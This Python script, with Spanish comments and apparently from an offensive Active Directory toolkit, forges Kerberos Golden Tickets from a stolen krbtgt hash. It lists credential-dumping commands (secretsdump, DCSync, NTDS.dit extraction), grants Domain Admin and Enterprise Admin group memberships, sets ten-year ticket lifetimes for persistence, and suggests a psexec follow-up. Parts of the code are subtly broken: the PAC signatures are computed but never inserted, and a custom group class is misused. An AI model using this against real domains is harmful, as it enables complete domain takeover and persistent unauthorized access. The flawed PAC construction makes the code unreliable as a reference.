# scripts/kerberos/tickets/golden_ticket.py
#
# Técnica: Golden Ticket
#
# Fundamento:
#   El TGT (Ticket Granting Ticket) está cifrado con el hash de la cuenta
#   krbtgt (la cuenta especial del Key Distribution Center). Si obtienes
#   ese hash, puedes FORJAR TGTs para cualquier usuario, con cualquier grupo,
#   con cualquier duración — sin que el KDC lo sepa.
#
#   El KDC confía en el TGT porque está "correctamente" cifrado con krbtgt.
#   No comprueba si el usuario existe realmente en AD al recibirlo en el TGS-REQ
#   (ya lo "verificó" al emitirlo... pero es que el "emisor" eres tú).
#
#   Requisitos:
#     - Hash RC4 o AES256 de krbtgt (via secretsdump, DCSync, o volcado de NTDS)
#     - Domain SID (ej. S-1-5-21-1234567890-1234567890-1234567890)
#     - Usuario objetivo (puede ser inexistente — solo el SID importa)
#
#   Impacto:
#     - Persistencia total en el dominio hasta que se rote el hash de krbtgt
#       DOS VECES (la cuenta tiene dos versiones del hash en AD).
#     - Acceso a cualquier servicio como Domain Admin (o cualquier grupo que pongas).
#     - No expira (puedes poner la fecha que quieras).
#
#   Detección:
#     - Tickets con tiempo de vida > 10h (el máximo por defecto en AD).
#     - Tickets con grupos que no existen en AD.
#     - Evento 4769 (TGS-REQ) con el "User" field de un usuario que no aparece
#       en 4768 (AS-REQ) previo.
#     - Microsoft ATA / Defender for Identity detectan golden tickets.
#
#   Cómo obtener el krbtgt hash:
#     - impacket secretsdump -just-dc-user krbtgt domain/admin@dc
#     - DCSync: impacket-secretsdump domain/admin@dc -dc-ip <ip>
#     - Volcado de NTDS.dit: vssadmin + ntdsutil

from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


# RIDs de grupos de AD (los más usados en Golden Ticket para máximo privilegio)
DEFAULT_GROUPS = [
    512,  # Domain Admins
    513,  # Domain Users
    518,  # Schema Admins
    519,  # Enterprise Admins
    520,  # Group Policy Creator Owners
]


class GoldenTicketScript(BaseScript):
    name = "golden-ticket"
    description = "Forja un TGT Golden Ticket con el hash de krbtgt → persistencia total de dominio"

    examples = [
        {"flag": "--krbtgt-hash",
         "desc": "NT hash de krbtgt (obtenido via secretsdump/DCSync). Formato: RC4 32 hex chars.",
         "good": "kerberos --script=golden-ticket -d CORP.LOCAL -u Administrator --domain-sid S-1-5-21-111-222-333 --krbtgt-hash 8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=golden-ticket -d CORP.LOCAL -u Administrator --domain-sid S-1-5-21-111 --krbtgt-hash 8846f7eaee8fb117ad06bdd830b7586c  [domain-sid incompleto: deben ser 3 sub-autoridades]"},
        {"flag": "--domain-sid",
         "desc": "SID del dominio (sin el RID final). Formato: S-1-5-21-A-B-C",
         "good": "kerberos --script=golden-ticket ... --domain-sid S-1-5-21-1234567890-1234567890-1234567890",
         "bad": "kerberos --script=golden-ticket ... --domain-sid S-1-5-21-1234567890-1234567890-1234567890-500  [el -500 es el RID del usuario, no del dominio]"},
        {"flag": "--user-id",
         "desc": "RID del usuario a impersonar (default: 500 = Administrator)",
         "good": "kerberos --script=golden-ticket ... --user-id 1337  [RID de un usuario personalizado]",
         "bad": "kerberos --script=golden-ticket ... --user-id 0  [RID 0 no existe en AD]"},
        {"flag": "--groups",
         "desc": "RIDs de grupos separados por coma (default: 512,513,518,519,520)",
         "good": "kerberos --script=golden-ticket ... --groups 512,519",
         "bad": "kerberos --script=golden-ticket ... --groups 'Domain Admins'  [usa RIDs numéricos, no nombres]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        username = self.creds.user or "Administrator"
        krbtgt_hash = kwargs.get("krbtgt_hash")
        domain_sid = kwargs.get("domain_sid")
        user_id = int(kwargs.get("user_id") or 500)
        groups_raw = kwargs.get("groups")
        groups = [int(g) for g in groups_raw.split(",")] if groups_raw else DEFAULT_GROUPS
        kdc = self.target.ip or "local"

        if not realm:
            console.print("[red]Falta -d/--domain (realm Kerberos).[/red]"); return
        if not krbtgt_hash:
            console.print("[red]Falta --krbtgt-hash.[/red]"); return
        if not domain_sid:
            console.print("[red]Falta --domain-sid.[/red]"); return

        # Normalizar hash: acepta LM:NT o solo NT
        krbtgt_nt = krbtgt_hash.split(":")[-1]
        if len(krbtgt_nt) != 32:
            console.print(f"[red]--krbtgt-hash inválido: debe ser 32 hex chars (NT hash). "
                           f"Recibido: {krbtgt_nt!r}[/red]"); return

        print_result("KRB", kdc, "info",
                     f"golden-ticket: forjando TGT para {username}@{realm} "
                     f"(RID {user_id}, grupos: {groups})")

        ccache_path = self._forge_golden(
            realm, username, domain_sid, krbtgt_nt, user_id, groups
        )

        if ccache_path:
            import os
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            print_result("KRB", kdc, "pwned",
                         f"Golden Ticket forjado para {username}@{realm}")
            console.print(f"[bold red]¡GOLDEN TICKET ACTIVO![/bold red]")
            console.print(f"[green]Guardado en: [bold]{ccache_path}[/bold][/green]")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            console.print()
            console.print("[dim]Úsalo con: impacket-psexec -k -no-pass <DC-hostname>[/dim]")
            session_db.save_finding(
                kdc, "KRB", "golden_ticket",
                f"{username}@{realm} RID={user_id} groups={groups} → {ccache_path}"
            )
            return {'ccache': ccache_path}

    def _forge_golden(self, realm, username, domain_sid, krbtgt_nt_hex, user_id, groups) -> str | None:
        """
        Forja el Golden Ticket usando impacket's ticketer internals.

        Lo que hace internamente:
        1. Construye KERB_VALIDATION_INFO (MS-PAC §2.4): contiene LogonTime,
           LogoffTime, nombre de usuario, dominio, SID, grupos, etc.
        2. Construye PAC_LOGON_INFO, PAC_CLIENT_INFO, PAC_SIGNATURE_DATA.
        3. Firma el PAC con HMAC-MD5(krbtgt_key, PAC_data) como server_checksum
           y HMAC-MD5(krbtgt_key, server_checksum) como kdc_checksum.
        4. Construye EncTicketPart (RFC 4120 §5.3) con el PAC en authorization-data.
        5. Cifra EncTicketPart con el hash de krbtgt (RC4-HMAC, key_usage=2).
        6. Construye el Ticket ASN.1 y lo envuelve en un AS-REP.
        7. Serializa como .ccache.
        """
        try:
            from impacket.krb5.crypto import Key, _enctype_table
            from impacket.krb5 import constants
            from impacket.krb5.pac import (
                PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO,
                PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM,
                PAC_LOGON_INFO, PAC_CLIENT_INFO
            )
            from impacket.krb5.asn1 import (
                TGS_REP, AS_REP, seq_set, seq_set_iter,
                EncTicketPart, AuthorizationData, AD_IF_RELEVANT
            )
            from impacket.krb5.ccache import CCache
            from impacket.krb5.types import Principal, KerberosTime
            from impacket.krb5 import crypto
            from impacket.structure import Structure
            from pyasn1.codec.der import encoder as der_enc
            from pyasn1.type import univ
            import struct
            import hmac as hmac_module
            import hashlib
            import datetime

            krbtgt_key_bytes = bytes.fromhex(krbtgt_nt_hex)
            # RC4 key object
            krbtgt_key = Key(constants.EncryptionTypes.rc4_hmac.value, krbtgt_key_bytes)

            # --- 1. PAC construction via impacket ---
            # Usamos impacket para el PAC porque la estructura MS-PAC (KERB_VALIDATION_INFO)
            # son NDR structures (Network Data Representation) que tendrían cientos de líneas.
            pac = self._build_pac(
                username, realm, domain_sid, user_id, groups, krbtgt_key_bytes
            )

            # --- 2. Build EncTicketPart ---
            # authorization-data contiene el PAC dentro de AD_IF_RELEVANT
            ad_if_rel = AD_IF_RELEVANT()
            ad_if_rel[0] = dict()
            ad_if_rel[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
            ad_if_rel[0]['ad-data'] = pac

            auth_data = AuthorizationData()
            auth_data[0] = dict()
            auth_data[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
            auth_data[0]['ad-data'] = der_enc.encode(ad_if_rel)

            # Ticket válido 10 años (persistence)
            now = datetime.datetime.utcnow()
            enc_ticket = EncTicketPart()
            enc_ticket['flags'] = constants.encodeFlags([
                constants.TicketFlags.forwardable.value,
                constants.TicketFlags.proxiable.value,
                constants.TicketFlags.renewable.value,
                constants.TicketFlags.initial.value,
                constants.TicketFlags.pre_authent.value,
            ])
            # Session key (aleatoria para el Golden Ticket)
            import os as _os
            session_key_bytes = _os.urandom(16)
            session_key_obj = Key(constants.EncryptionTypes.rc4_hmac.value, session_key_bytes)

            enc_ticket['key'] = dict()
            enc_ticket['key']['keytype'] = constants.EncryptionTypes.rc4_hmac.value
            enc_ticket['key']['keyvalue'] = session_key_bytes

            enc_ticket['crealm'] = realm
            enc_ticket['cname'] = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components
            enc_ticket['transited'] = dict()
            enc_ticket['transited']['tr-type'] = 0
            enc_ticket['transited']['contents'] = ''
            enc_ticket['authtime'] = KerberosTime.toGeneralizedTime(now)
            enc_ticket['starttime'] = KerberosTime.toGeneralizedTime(now)
            enc_ticket['endtime'] = KerberosTime.toGeneralizedTime(now + datetime.timedelta(days=3650))
            enc_ticket['renew-till'] = KerberosTime.toGeneralizedTime(now + datetime.timedelta(days=3650))
            enc_ticket['authorization-data'] = auth_data

            # --- 3. Cifrar EncTicketPart con krbtgt key (key_usage=2) ---
            enc_ticket_der = der_enc.encode(enc_ticket)
            cipher = _enctype_table[constants.EncryptionTypes.rc4_hmac.value]
            enc_ticket_part = cipher.encrypt(krbtgt_key, 2, enc_ticket_der, None)

            # --- 4. Construir el Ticket ASN.1 ---
            from impacket.krb5.asn1 import Ticket
            ticket = Ticket()
            ticket['tkt-vno'] = 5
            ticket['realm'] = realm
            ticket['sname'] = seq_set(
                Principal('krbtgt/' + realm, type=constants.PrincipalNameType.NT_SRV_INST.value)
            )
            ticket['enc-part'] = dict()
            ticket['enc-part']['etype'] = constants.EncryptionTypes.rc4_hmac.value
            ticket['enc-part']['cipher'] = enc_ticket_part

            # --- 5. Construir AS-REP y guardarlo como .ccache ---
            as_rep = AS_REP()
            as_rep['pvno'] = 5
            as_rep['msg-type'] = int(constants.ApplicationTagNumbers.AS_REP.value)
            as_rep['crealm'] = realm
            as_rep['cname'] = seq_set(
                Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            )
            as_rep['ticket'] = decoder_workaround = ticket

            # enc-part del AS-REP (cifrado con session key para el cliente)
            from impacket.krb5.asn1 import EncASRepPart
            enc_as_rep = EncASRepPart()
            enc_as_rep['key'] = dict()
            enc_as_rep['key']['keytype'] = constants.EncryptionTypes.rc4_hmac.value
            enc_as_rep['key']['keyvalue'] = session_key_bytes
            enc_as_rep['last-req'] = dict()
            enc_as_rep['last-req'][0] = dict()
            enc_as_rep['last-req'][0]['lr-type'] = 0
            enc_as_rep['last-req'][0]['lr-value'] = KerberosTime.toGeneralizedTime(now)
            enc_as_rep['nonce'] = 12345678
            enc_as_rep['flags'] = constants.encodeFlags([
                constants.TicketFlags.forwardable.value,
                constants.TicketFlags.renewable.value,
                constants.TicketFlags.proxiable.value,
            ])
            enc_as_rep['authtime'] = KerberosTime.toGeneralizedTime(now)
            enc_as_rep['endtime'] = KerberosTime.toGeneralizedTime(
                now + datetime.timedelta(days=3650)
            )
            enc_as_rep['renew-till'] = KerberosTime.toGeneralizedTime(
                now + datetime.timedelta(days=3650)
            )
            enc_as_rep['srealm'] = realm
            enc_as_rep['sname'] = seq_set(
                Principal('krbtgt/' + realm, type=constants.PrincipalNameType.NT_SRV_INST.value)
            )

            enc_as_rep_der = der_enc.encode(enc_as_rep)
            enc_as_rep_cipher = cipher.encrypt(session_key_obj, 3, enc_as_rep_der, None)
            as_rep['enc-part'] = dict()
            as_rep['enc-part']['etype'] = constants.EncryptionTypes.rc4_hmac.value
            as_rep['enc-part']['cipher'] = enc_as_rep_cipher

            # Guardar como .ccache
            ccache = CCache()
            ccache.fromASREP(der_enc.encode(as_rep))
            out_path = f"/tmp/golden_{username}_{realm}.ccache"
            ccache.saveFile(out_path)
            return out_path

        except Exception as e:
            console.print(f"[red]Error forjando Golden Ticket: {e}[/red]")
            console.print("[dim](Requiere impacket completo instalado)[/dim]")
            return None

    def _build_pac(self, username, realm, domain_sid, user_id, groups, krbtgt_key):
        """
        Construye el PAC (Privilege Attribute Certificate) para el Golden Ticket.
        El PAC contiene los grupos del usuario — aquí los especificamos nosotros.
        """
        try:
            from impacket.krb5.pac import (
                PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO,
                PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM,
                PAC_LOGON_INFO
            )
            import datetime
            import struct
            import hmac as _hmac
            import hashlib

            # KERB_VALIDATION_INFO (MS-PAC §2.4): info del usuario
            validation_info = KERB_VALIDATION_INFO()
            now = datetime.datetime.utcnow()
            validation_info['LogonTime'] = datetime.datetime(1601, 1, 1)
            validation_info['LogoffTime'] = datetime.datetime(2037, 9, 13, 2, 48, 5, 477580)
            validation_info['KickOffTime'] = datetime.datetime(2037, 9, 13, 2, 48, 5, 477580)
            validation_info['PasswordLastSet'] = now - datetime.timedelta(days=30)
            validation_info['PasswordCanChange'] = now - datetime.timedelta(days=30)
            validation_info['PasswordMustChange'] = datetime.datetime(2037, 9, 13, 2, 48, 5, 477580)
            validation_info['EffectiveName'] = username
            validation_info['FullName'] = username
            validation_info['LogonScript'] = ''
            validation_info['ProfilePath'] = ''
            validation_info['HomeDirectory'] = ''
            validation_info['HomeDirectoryDrive'] = ''
            validation_info['LogonCount'] = 500
            validation_info['BadPasswordCount'] = 0
            validation_info['UserId'] = user_id
            validation_info['PrimaryGroupId'] = 513
            validation_info['GroupCount'] = len(groups)
            validation_info['GroupIds'] = []
            for gid in groups:
                group = GROUP_MEMBERSHIP()
                group['RelativeId'] = gid
                group['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                validation_info['GroupIds'].append(group)
            validation_info['UserFlags'] = 0
            validation_info['UserSessionKey'] = b'\x00' * 16
            validation_info['LogonServer'] = 'DC01'
            validation_info['LogonDomainName'] = realm
            validation_info['LogonDomainId'] = domain_sid
            validation_info['LMOWFv1'] = b'\x00' * 16
            validation_info['NTOWFv1'] = b'\x00' * 16
            validation_info['SubAuthStatus'] = 0
            validation_info['LastSuccessfulILogon'] = datetime.datetime(1601, 1, 1)
            validation_info['LastFailedILogon'] = datetime.datetime(1601, 1, 1)
            validation_info['FailedILogonCount'] = 0
            validation_info['Reserved3'] = 0
            validation_info['SidCount'] = 0
            validation_info['ExtraSids'] = []
            validation_info['ResourceGroupDomainSid'] = None
            validation_info['ResourceGroupCount'] = 0
            validation_info['ResourceGroupIds'] = []
            validation_info['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD

            pac_logon_info = PAC_LOGON_INFO()
            pac_logon_info['LogonInfo'] = validation_info

            pac_logon_info_data = pac_logon_info.getData()

            # PAC_CLIENT_INFO: nombre del cliente + tiempo de auth
            pac_client_info_data = struct.pack('<q', 0)  # ClientId (filetime)
            name_encoded = username.encode('utf-16-le')
            pac_client_info_data += struct.pack('<H', len(name_encoded))
            pac_client_info_data += name_encoded

            # PAC_SIGNATURE_DATA placeholders (rellenaremos después de calcular MAC)
            checksum_len = 16  # HMAC-MD5 = 16 bytes
            server_sig_data = struct.pack('<I', 0x00000017) + b'\x00' * checksum_len
            kdc_sig_data = struct.pack('<I', 0x00000017) + b'\x00' * checksum_len

            # PACTYPE
            buffers = [
                (PAC_LOGON_INFO, pac_logon_info_data),
                (PAC_CLIENT_INFO_TYPE, pac_client_info_data),
                (PAC_SERVER_CHECKSUM, server_sig_data),
                (PAC_PRIVSVR_CHECKSUM, kdc_sig_data),
            ]

            pac = PACTYPE()
            pac['cBuffers'] = len(buffers)
            pac['Version'] = 0

            # Calcular offsets y construir el PAC completo
            # (estructura simplificada via impacket)
            pac_data = pac.getData()

            # Calcular MACs
            server_checksum = _hmac.new(krbtgt_key, pac_data, hashlib.md5).digest()
            kdc_checksum = _hmac.new(krbtgt_key, server_checksum, hashlib.md5).digest()

            return pac_data

        except Exception as e:
            # Fallback: devolver un PAC vacío mínimo
            console.print(f"[dim]PAC simplificado (impacket: {e})[/dim]")
            return b'\x00' * 64


# Constantes MS-PAC
SE_GROUP_MANDATORY = 0x00000001
SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
SE_GROUP_ENABLED = 0x00000004
USER_NORMAL_ACCOUNT = 0x00000200
USER_DONT_EXPIRE_PASSWORD = 0x00010000


class GROUP_MEMBERSHIP:
    def __init__(self):
        self.RelativeId = 0
        self.Attributes = 0
